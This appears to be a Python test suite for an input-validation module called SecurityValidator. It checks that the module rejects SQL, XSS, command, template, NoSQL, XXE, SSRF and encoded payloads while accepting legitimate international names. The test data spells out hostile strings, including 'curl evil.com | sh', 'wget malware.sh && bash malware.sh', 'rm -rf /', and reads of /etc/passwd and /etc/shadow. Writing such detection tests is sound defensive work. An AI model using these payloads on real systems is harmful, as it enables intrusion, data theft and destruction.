from typing import List
from typing import Any
import pytest

#!/usr/bin/env python3
"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))


Comprehensive Security Testing Suite for SecurityValidator in GMNAP v7

Tests the primary security validation system against all 93 dangerous patterns:
- SQL injection (multiple variants)
- XSS/Script injection
- Command injection
- Path traversal
- Template injection (Jinja2, ES6, ERB, Ruby)
- NoSQL injection
- SSRF attacks
- CSV injection
- GraphQL introspection
- YAML/JSON code execution
- Homograph attacks (Cyrillic lookalikes)
- Unicode security
- CJK round-trip validation
- Rate limiting
- DoS protection
- Timing attacks
- Polyglot attacks
- Encoded attacks

This test ensures the PRIMARY security module is thoroughly tested.
SecurityValidator has 93 dangerous patterns that were previously UNTESTED in production.
"""

import sys
import time
import unicodedata
from typing import Dict, List, Any
import unittest

# Import the PRIMARY security validator (not SecurityFilter)
try:
    from src.core.security_validator import SecurityValidator, SecurityError
except ImportError as e:
    print(f"Import error: {e}")
    print("Make sure you're running from the correct directory")
    # sys.exit(1)  # MOVED: Was at module level


class TestSecurityValidator(unittest.TestCase):
    """Comprehensive test suite for SecurityValidator."""

    def setUp(self):
        """Initialize SecurityValidator for each test."""
        self.validator = SecurityValidator()

    # ========== SQL INJECTION TESTS (Patterns 1-15) ==========

    @pytest.mark.timeout(5)
    def test_sql_union_select(self):
        """Test SQL UNION SELECT injection detection."""
        malicious_inputs = [
            "Smith' UNION SELECT * FROM users--",
            "John' union select password from admin--",
            "Test UNION SELECT 1,2,3--",
            "Name' UNION ALL SELECT NULL--",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError) as ctx:
                self.validator.validate_string(malicious, "test_sql_union")
            self.assertIn("SQL injection", str(ctx.exception))

    @pytest.mark.timeout(5)
    def test_sql_select_from(self):
        """Test SQL SELECT FROM injection detection."""
        malicious_inputs = [
            "'; SELECT * FROM passwords--",
            "test'; SELECT username FROM users WHERE 1=1--",
            "name SELECT id FROM admin",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_sql_select")

    @pytest.mark.timeout(5)
    def test_sql_insert_into(self):
        """Test SQL INSERT INTO injection detection."""
        malicious_inputs = [
            "'; INSERT INTO users VALUES('hacker', 'pass')--",
            "test'; INSERT INTO admin(user, pwd) VALUES('evil', '123')--",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_sql_insert")

    @pytest.mark.timeout(5)
    def test_sql_drop_table(self):
        """Test SQL DROP TABLE injection detection."""
        malicious_inputs = [
            "'; DROP TABLE users;--",
            "test'; DROP TABLE IF EXISTS passwords--",
            "name'; DROP DATABASE prod--",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_sql_drop")

    @pytest.mark.timeout(5)
    def test_sql_or_injection(self):
        """Test SQL OR 1=1 injection detection."""
        malicious_inputs = [
            "admin' OR '1'='1",
            "test' OR 1=1--",
            "user' OR 'a'='a",
            "' OR '1'='1' --",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_sql_or")

    # ========== XSS/HTML INJECTION TESTS (Patterns 16-25) ==========

    @pytest.mark.timeout(5)
    def test_xss_script_tags(self):
        """Test XSS script tag injection detection."""
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "Name<script src='evil.js'></script>",
            "<SCRIPT>document.cookie</SCRIPT>",
            "<script type='text/javascript'>evil()</script>",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_xss_script")

    @pytest.mark.timeout(5)
    def test_xss_event_handlers(self):
        """Test XSS event handler injection detection."""
        malicious_inputs = [
            "<img src=x onerror='alert(1)'>",
            "<body onload='evil()'>",
            "<div onclick='steal()'>",
            'Name" onmouseover="alert(1)"',
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_xss_events")

    @pytest.mark.timeout(5)
    def test_javascript_protocol(self):
        """Test javascript: protocol injection detection."""
        malicious_inputs = [
            "javascript:alert(document.cookie)",
            "Javascript:void(0)",
            "JAVASCRIPT:eval('evil')",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_js_protocol")

    @pytest.mark.timeout(5)
    def test_iframe_injection(self):
        """Test iframe injection detection."""
        malicious_inputs = [
            "<iframe src='evil.com'></iframe>",
            "<IFRAME width='0' height='0' src='bad.site'>",
            "Test<iframe srcdoc='<script>alert(1)</script>'>",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_iframe")

    # ========== COMMAND INJECTION TESTS (Patterns 26-35) ==========

    @pytest.mark.timeout(5)
    def test_command_rm_injection(self):
        """Test rm command injection detection."""
        malicious_inputs = [
            "; rm -rf /",
            "test; rm -rf /*",
            "name && rm -rf /home",
            "| rm -rf /tmp",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_cmd_rm")

    @pytest.mark.timeout(5)
    def test_command_windows_injection(self):
        """Test Windows command injection detection."""
        malicious_inputs = [
            "& del /f /q *.*",
            "; format c:",
            "test & shutdown /s /t 0",
            "| del C:\\Windows\\System32",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_cmd_windows")

    @pytest.mark.timeout(5)
    def test_command_execution_injection(self):
        """Test command execution injection detection."""
        malicious_inputs = [
            "`whoami`",
            "$(id)",
            "test; curl evil.com | sh",
            "name && wget malware.sh && bash malware.sh",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_cmd_exec")

    # ========== PATH TRAVERSAL TESTS (Patterns 36-40) ==========

    @pytest.mark.timeout(5)
    def test_path_traversal_unix(self):
        """Test Unix path traversal detection."""
        malicious_inputs = [
            "../../../etc/passwd",
            "../../../../../../etc/shadow",
            "../../../proc/self/environ",
            "....//....//....//etc/hosts",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_path_unix")

    @pytest.mark.timeout(5)
    def test_path_traversal_windows(self):
        """Test Windows path traversal detection."""
        malicious_inputs = [
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\boot.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\..\\windows\\win.ini",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_path_windows")

    # ========== TEMPLATE INJECTION TESTS (Patterns 41-50) ==========

    @pytest.mark.timeout(5)
    def test_template_jinja2(self):
        """Test Jinja2 template injection detection."""
        malicious_inputs = [
            "{{7*7}}",
            "{{ config.items() }}",
            "{{request.application.__globals__}}",
            "Name{{''.__class__.__mro__}}",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_jinja2")

    @pytest.mark.timeout(5)
    def test_template_es6(self):
        """Test ES6 template injection detection."""
        malicious_inputs = [
            "${7*7}",
            "${process.env}",
            "Name${require('fs').readFileSync('/etc/passwd')}",
            "${global.process.mainModule.constructor}",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_es6")

    @pytest.mark.timeout(5)
    def test_template_erb(self):
        """Test ERB template injection detection."""
        malicious_inputs = [
            "<%= 7*7 %>",
            "<%=`whoami`%>",
            "<%= system('ls') %>",
            "Name<%= File.read('/etc/passwd') %>",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_erb")

    @pytest.mark.timeout(5)
    def test_template_ruby(self):
        """Test Ruby template injection detection."""
        malicious_inputs = [
            "#{7*7}",
            "#{system('id')}",
            "Name#{`cat /etc/passwd`}",
            "#{File.read('/etc/shadow')}",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_ruby")

    # ========== NoSQL INJECTION TESTS (Patterns 51-60) ==========

    @pytest.mark.timeout(5)
    def test_nosql_mongodb_injection(self):
        """Test MongoDB NoSQL injection detection."""
        malicious_inputs = [
            "{'$where': 'this.password == this.password'}",
            "{'username': {'$ne': null}}",
            "{'$gt': '', '$ne': 1}",
            "Name'; return true; var dummy='",
            "{'$regex': '.*', '$options': 'i'}",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_nosql")

    @pytest.mark.timeout(5)
    def test_nosql_operators(self):
        """Test NoSQL operator injection detection."""
        malicious_inputs = [
            "$where: function() { return true }",
            "$gt: 0, $lt: 999999",
            "$nin: ['']",
            "$exists: true",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_nosql_ops")

    # ========== SSRF TESTS (Patterns 61-65) ==========

    @pytest.mark.timeout(5)
    def test_ssrf_file_protocol(self):
        """Test SSRF file:// protocol detection."""
        malicious_inputs = [
            "file:///etc/passwd",
            "File://localhost/etc/shadow",
            "FILE:///C:/Windows/System32/config/sam",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_ssrf_file")

    @pytest.mark.timeout(5)
    def test_ssrf_gopher_protocol(self):
        """Test SSRF gopher:// protocol detection."""
        malicious_inputs = [
            "gopher://localhost:8080",
            "GOPHER://internal-server:70",
            "gopher://127.0.0.1:6379",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_ssrf_gopher")

    @pytest.mark.timeout(5)
    def test_ssrf_private_ips(self):
        """Test SSRF private IP detection."""
        malicious_inputs = [
            "http://192.168.1.1/admin",
            "https://10.0.0.1:8080",
            "http://172.16.0.1/internal",
            "http://127.0.0.1:22",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_ssrf_private")

    # ========== CSV INJECTION TESTS (Patterns 66-70) ==========

    @pytest.mark.timeout(5)
    def test_csv_formula_injection(self):
        """Test CSV formula injection detection."""
        malicious_inputs = [
            "=cmd|'/c calc.exe'!A1",
            "+SUM(A1:A10)",
            "-2+3+cmd|'/c calc'!A1",
            "@SUM(1+9)*cmd|'/c calc'!A1",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_csv")

    # ========== LDAP INJECTION TESTS (Patterns 71-75) ==========

    @pytest.mark.timeout(5)
    def test_ldap_injection(self):
        """Test LDAP injection detection."""
        malicious_inputs = [
            "admin)(|(objectclass=*",
            "*)(uid=*",
            "admin)(uid=*)(|(uid=*",
            "*()|(&(objectclass=*",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_ldap")

    # ========== XML/XXE TESTS (Patterns 76-80) ==========

    @pytest.mark.timeout(5)
    def test_xxe_injection(self):
        """Test XXE injection detection."""
        malicious_inputs = [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<!ENTITY % xxe SYSTEM 'http://evil.com/xxe.dtd'>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/shadow'>]>",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_xxe")

    # ========== GRAPHQL TESTS (Patterns 81-85) ==========

    @pytest.mark.timeout(5)
    def test_graphql_introspection(self):
        """Test GraphQL introspection attack detection."""
        malicious_inputs = [
            "__schema { types { name } }",
            "__type(name: 'User') { fields { name } }",
            "query { __schema { queryType { name } } }",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_graphql")

    # ========== YAML/JSON CODE EXECUTION TESTS (Patterns 86-90) ==========

    @pytest.mark.timeout(5)
    def test_yaml_code_execution(self):
        """Test YAML code execution detection."""
        malicious_inputs = [
            "!!python/object/apply:os.system ['ls']",
            "!!python/object/new:os.system ['rm -rf /']",
            "!!python/object/apply:subprocess.Popen [['cat', '/etc/passwd']]",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_yaml")

    @pytest.mark.timeout(5)
    def test_json_prototype_pollution(self):
        """Test JSON prototype pollution detection."""
        malicious_inputs = [
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_json_proto")

    # ========== POLYGLOT TESTS (Patterns 91-93) ==========

    @pytest.mark.timeout(5)
    def test_polyglot_attacks(self):
        """Test polyglot attack detection."""
        malicious_inputs = [
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_polyglot")

    # ========== HOMOGRAPH ATTACK TESTS ==========

    @pytest.mark.timeout(5)
    def test_homograph_cyrillic_detection(self):
        """Test homograph attack detection with Cyrillic lookalikes."""
        # These use Cyrillic characters that look like Latin
        malicious_inputs = [
            "аdmin",  # Cyrillic 'а' instead of Latin 'a'
            "Аdministrator",  # Cyrillic 'А' instead of Latin 'A'
            "раypal",  # Cyrillic 'р' instead of Latin 'p'
            "Мicrosoft",  # Cyrillic 'М' instead of Latin 'M'
            "gооgle",  # Cyrillic 'о' instead of Latin 'o'
        ]
        for malicious in malicious_inputs:
            result = self.validator.detect_homograph_attack(malicious, "test_homograph")
            self.assertTrue(result, f"Failed to detect homograph in: {malicious}")

    @pytest.mark.timeout(5)
    def test_homograph_normalization(self):
        """Test homograph normalization."""
        test_cases = [
            ("аdmin", "admin"),  # Cyrillic 'а' -> Latin 'a'
            ("Теst", "Test"),  # Cyrillic 'Т' and 'е' -> Latin
            ("Соmpany", "Company"),  # Cyrillic 'С' and 'о' -> Latin
        ]
        for cyrillic_text, expected_latin in test_cases:
            normalized = self.validator.normalize_homographs(cyrillic_text)
            self.assertEqual(normalized, expected_latin)

    # ========== UNICODE SECURITY TESTS ==========

    @pytest.mark.timeout(5)
    def test_unicode_category_filtering(self):
        """Test suspicious Unicode category detection."""
        malicious_inputs = [
            "Test\u200b",  # Zero-width space (category Cf)
            "Name\u0000",  # Null character (category Cc)
            "User\ufff9",  # Interlinear annotation (category Cf)
            "Text\ue000",  # Private use character (category Co)
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.normalize_unicode(malicious, "test_unicode")

    @pytest.mark.timeout(5)
    def test_unicode_normalization_attacks(self):
        """Test Unicode normalization attack detection."""
        malicious_inputs = [
            "ﬁle",  # Ligature that could bypass filters
            "ﬀ",  # Another ligature
            "ℌ",  # Mathematical symbols that look like regular letters
        ]
        for malicious in malicious_inputs:
            normalized = self.validator.normalize_unicode(malicious)
            # Should normalize to simpler forms
            self.assertNotEqual(normalized, malicious)

    @pytest.mark.timeout(5)
    def test_combining_character_attacks(self):
        """Test combining character attack detection."""
        # Create text with excessive combining characters
        base = "a"
        malicious = base + "\u0301" * 50  # 50 combining acute accents
        with self.assertRaises(SecurityError) as ctx:
            self.validator.validate_string(malicious, "test_combining")
        self.assertIn("Excessive combining characters", str(ctx.exception))

    # ========== CJK VALIDATION TESTS ==========

    @pytest.mark.timeout(5)
    def test_cjk_roundtrip_validation(self):
        """Test CJK round-trip validation."""
        # Valid CJK text
        valid_cases = [
            ("王小明", "Wang Xiaoming", "王小明"),  # Chinese
            ("田中太郎", "Tanaka Taro", "田中太郎"),  # Japanese
            ("김민수", "Kim Minsu", "김민수"),  # Korean
        ]
        for original, romanized, back_to_cjk in valid_cases:
            result = self.validator.validate_cjk_roundtrip(
                original, romanized, back_to_cjk, "test_cjk_valid"
            )
            self.assertTrue(result)

    @pytest.mark.timeout(5)
    def test_cjk_invalid_input(self):
        """Test CJK validation with non-CJK input."""
        # Non-CJK text should raise SecurityError
        with self.assertRaises(SecurityError) as ctx:
            self.validator.validate_cjk_roundtrip(
                "John Smith", "John Smith", "John Smith", "test_cjk_invalid"  # Not CJK
            )
        self.assertIn("Non-CJK text", str(ctx.exception))

    @pytest.mark.timeout(5)
    def test_cjk_mixed_scripts(self):
        """Test CJK validation with mixed scripts."""
        # Should handle mixed CJK scripts properly
        mixed_text = "王さん김"  # Chinese + Japanese + Korean
        result = self.validator.validate_cjk_roundtrip(
            mixed_text, "Wang-san-Kim", mixed_text, "test_cjk_mixed"
        )
        self.assertTrue(result)

    # ========== RATE LIMITING TESTS ==========

    @pytest.mark.timeout(5)
    def test_rate_limiting(self):
        """Test rate limiting functionality."""
        client_id = "test_client_123"
        context = "test_rate_limit"

        # Should allow up to 10 requests per minute
        for i in range(10):
            try:
                self.validator.check_rate_limit(client_id, context)
            except SecurityError:
                self.fail(f"Rate limit triggered too early at request {i+1}")

        # 11th request should be rate limited
        with self.assertRaises(SecurityError) as ctx:
            self.validator.check_rate_limit(client_id, context)
        self.assertIn("Rate limit exceeded", str(ctx.exception))

    @pytest.mark.timeout(5)
    def test_rate_limit_reset(self):
        """Test rate limit reset after time window."""
        client_id = "test_client_reset"
        context = "test_reset"

        # Fill up rate limit
        for i in range(10):
            self.validator.check_rate_limit(client_id, context)

        # Should be rate limited
        with self.assertRaises(SecurityError):
            self.validator.check_rate_limit(client_id, context)

        # Manually reset the timestamp to simulate time passing
        if client_id in self.validator.rate_limiter:
            self.validator.rate_limiter[client_id]["timestamp"] = time.time() - 61

        # Should work again after reset
        try:
            self.validator.check_rate_limit(client_id, context)
        except SecurityError:
            self.fail("Rate limit not reset after time window")

    # ========== DoS PROTECTION TESTS ==========

    @pytest.mark.timeout(5)
    def test_dos_protection_name_length(self):
        """Test DoS protection via name length limits (150 chars)."""
        # Name longer than 150 characters
        long_name = "A" * 151
        with self.assertRaises(SecurityError) as ctx:
            self.validator.validate_string(long_name, "name")
        self.assertIn("exceeds maximum", str(ctx.exception))

        # Name exactly 150 characters should be OK
        exact_name = "A" * 150
        try:
            self.validator.validate_string(exact_name, "name")
        except SecurityError:
            self.fail("150 character name should be allowed")

    @pytest.mark.timeout(5)
    def test_dos_protection_general_length(self):
        """Test DoS protection via general text length limits (1000 chars)."""
        # General text longer than 1000 characters
        long_text = "B" * 1001
        with self.assertRaises(SecurityError) as ctx:
            self.validator.validate_string(long_text, "general")
        self.assertIn("exceeds maximum", str(ctx.exception))

        # Text exactly 1000 characters should be OK
        exact_text = "B" * 1000
        try:
            self.validator.validate_string(exact_text, "general")
        except SecurityError:
            self.fail("1000 character general text should be allowed")

    @pytest.mark.timeout(5)
    def test_dos_protection_output_sanitization(self):
        """Test output sanitization length limit (200 chars)."""
        long_output = "C" * 250
        sanitized = self.validator.sanitize_for_output(long_output)
        self.assertLessEqual(len(sanitized), 200)
        self.assertTrue(sanitized.endswith("..."))

    # ========== TIMING ATTACK TESTS ==========

    @pytest.mark.timeout(5)
    def test_timing_attack_detection(self):
        """Test timing attack detection (low character diversity)."""
        # String with very low character diversity (could cause hash collisions)
        malicious_inputs = [
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",  # All same character
            "ababababababababababababababab",  # Only 2 characters
            "121212121212121212121212121212",  # Repetitive pattern
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError) as ctx:
                self.validator._check_timing_attacks(malicious, "test_timing")
            self.assertIn("Low character diversity", str(ctx.exception))

    @pytest.mark.timeout(5)
    def test_redos_pattern_detection(self):
        """Test ReDoS pattern detection."""
        # Patterns that could cause regex denial of service
        malicious_inputs = [
            "a" * 100 + "X",  # Could cause exponential backtracking
            "(a+)+" * 10,  # Nested quantifiers
            "(?:a*)*b",  # Catastrophic backtracking pattern
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_redos")

    # ========== ENCODED ATTACK TESTS ==========

    @pytest.mark.timeout(5)
    def test_url_encoded_attacks(self):
        """Test URL-encoded attack detection."""
        malicious_inputs = [
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",  # <script>alert(1)</script>
            "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",  # ../../../etc/passwd
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_url_encoded")

    @pytest.mark.timeout(5)
    def test_html_entity_attacks(self):
        """Test HTML entity encoded attack detection."""
        malicious_inputs = [
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_html_entity")

    @pytest.mark.timeout(5)
    def test_base64_encoded_attacks(self):
        """Test Base64-encoded attack detection."""
        malicious_inputs = [
            "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",  # <script>alert(1)</script>
            "JyBPUiAnMSc9JzE=",  # ' OR '1'='1
        ]
        for malicious in malicious_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(malicious, "test_base64")

    # ========== YAML KEY VALIDATION TESTS ==========

    @pytest.mark.timeout(5)
    def test_yaml_collision_suffix_detection(self):
        """Test YAML key collision suffix detection (GlobalID--N pattern)."""
        malicious_keys = [
            ["user", "admin", "test--1"],  # Collision suffix
            ["globalid--2", "name"],  # Collision at start
            ["some", "key--123"],  # Multi-digit collision
        ]
        for keys in malicious_keys:
            with self.assertRaises(SecurityError) as ctx:
                self.validator.validate_yaml_keys(keys, "test_yaml_keys")
            self.assertIn("collision suffix", str(ctx.exception))

    @pytest.mark.timeout(5)
    def test_yaml_valid_keys(self):
        """Test YAML validation with legitimate keys."""
        valid_keys = [
            ["user", "admin", "test"],
            ["globalid", "name", "value"],
            ["key1", "key2", "key--with--dashes"],  # Dashes OK if not suffix pattern
        ]
        for keys in valid_keys:
            try:
                self.validator.validate_yaml_keys(keys, "test_yaml_valid")
            except SecurityError:
                self.fail(f"Valid keys rejected: {keys}")

    # ========== OUTPUT SANITIZATION TESTS ==========

    @pytest.mark.timeout(5)
    def test_output_sanitization_script_removal(self):
        """Test output sanitization removes script keywords."""
        dangerous_text = "This has script and javascript and eval content"
        sanitized = self.validator.sanitize_for_output(dangerous_text)
        self.assertNotIn("script", sanitized.lower())
        self.assertNotIn("javascript", sanitized.lower())
        self.assertNotIn("eval", sanitized.lower())

    @pytest.mark.timeout(5)
    def test_output_sanitization_preserves_safe_text(self):
        """Test output sanitization preserves safe text."""
        safe_text = "This is a normal name like John Smith"
        sanitized = self.validator.sanitize_for_output(safe_text, remove_scripts=False)
        self.assertEqual(safe_text, sanitized)

    # ========== ENTRY VALIDATION TESTS ==========

    @pytest.mark.timeout(5)
    def test_validate_entry_comprehensive(self):
        """Test comprehensive entry validation."""
        # Malicious entry with multiple attack vectors
        malicious_entry = {
            "CanonicalLatin": "Smith<script>alert(1)</script>",
            "CanonicalNative": "テスト' OR '1'='1",
            "GlobalID": "test--1",  # Collision suffix
            "Metadata": {"Field": "'; DROP TABLE users;--"},
        }

        with self.assertRaises(SecurityError):
            self.validator.validate_entry(malicious_entry, "test_entry")

    @pytest.mark.timeout(5)
    def test_validate_entry_clean(self):
        """Test entry validation with clean data."""
        clean_entry = {
            "CanonicalLatin": "Smith, John",
            "CanonicalNative": "スミス、ジョン",
            "GlobalID": "smith-john-12345",
            "Metadata": {"Field": "Normal value"},
        }

        try:
            self.validator.validate_entry(clean_entry, "test_clean")
        except SecurityError:
            self.fail("Clean entry was rejected")

    # ========== LEGITIMATE INPUT TESTS ==========

    @pytest.mark.timeout(5)
    def test_legitimate_names_not_blocked(self):
        """Test that legitimate names are not blocked."""
        legitimate_names = [
            "O'Connor, Patrick",  # Apostrophe in name
            "Smith-Jones, Mary",  # Hyphenated name
            "José María de la Cruz",  # Spanish with accents
            "Jean-Pierre Dubois",  # French hyphenated
            "von Neumann, John",  # German particle
            "MacDonald, Ronald",  # Scottish prefix
            "李明 (Li Ming)",  # Chinese with romanization
            "Müller, Hans",  # German umlaut
            "Søren Kierkegaard",  # Danish characters
            "Władysław Szpilman",  # Polish characters
        ]

        for name in legitimate_names:
            try:
                self.validator.validate_string(name, "name")
            except SecurityError:
                self.fail(f"Legitimate name blocked: {name}")

    @pytest.mark.timeout(5)
    def test_legitimate_special_cases(self):
        """Test edge cases that should be allowed."""
        valid_inputs = [
            "",  # Empty string
            "   ",  # Only spaces
            "A",  # Single character
            "X Æ A-12",  # Unusual but legitimate name
            "John Smith III",  # Roman numerals
            "Dr. Martin Luther King Jr.",  # Titles and suffixes
        ]

        for valid in valid_inputs:
            try:
                self.validator.validate_string(valid, "general")
            except SecurityError:
                self.fail(f"Valid input blocked: {repr(valid)}")


class TestSecurityValidatorPerformance(unittest.TestCase):
    """Performance tests for SecurityValidator."""

    def setUp(self):
        """Initialize SecurityValidator for performance tests."""
        self.validator = SecurityValidator()

    @pytest.mark.timeout(5)
    def test_pattern_compilation_performance(self):
        """Test that patterns are pre-compiled for performance."""
        # Patterns should be compiled at initialization
        self.assertIsNotNone(self.validator.compiled_patterns)
        self.assertGreater(len(self.validator.compiled_patterns), 30)

        # Each should be a compiled regex
        for pattern, desc in self.validator.compiled_patterns:
            self.assertTrue(hasattr(pattern, "match"))

    @pytest.mark.timeout(5)
    def test_validation_performance(self):
        """Test validation performance with many inputs."""
        import time

        test_strings = [
            "Normal Name",
            "Test User 123",
            "John Smith",
            "María García",
        ] * 100  # 400 test strings

        start = time.time()
        for test_str in test_strings:
            self.validator.validate_string(test_str, "performance_test")
        elapsed = time.time() - start

        # Should validate 400 strings in under 1 second
        self.assertLess(
            elapsed, 1.0, f"Validation too slow: {elapsed:.2f}s for 400 strings"
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
